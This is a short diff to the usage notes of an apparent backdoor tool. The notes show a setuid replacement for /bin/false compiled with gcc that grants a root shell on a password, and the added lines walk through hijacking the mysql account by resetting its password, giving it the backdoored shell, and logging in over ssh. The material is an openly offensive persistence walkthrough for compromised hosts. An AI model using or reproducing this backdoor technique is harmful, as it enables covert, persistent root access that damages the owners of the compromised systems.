@@ -5,8 +5,13 @@ Usage:
 root@owned~# gcc false.c -o /bin/false -lcrypt ;chmod u+s /bin/false ;su lol
 lol@owned~$ false lol
 password:
-root@owned~# usermod -s /bin/false lol
-root@owned~# exit
+root@owned~: # we're root! lets door the mysql account...
+root@owned~: passwd mysql
+Enter new UNIX password: 
+Confirm new UNIX password:
+password updated!
+root@owned~# usermod -s /bin/false mysql
+root@owned~# passwd mqsql
 lol@owned~$ exit
 exit
 me@secure~$ ssh mysql@db -C whatever
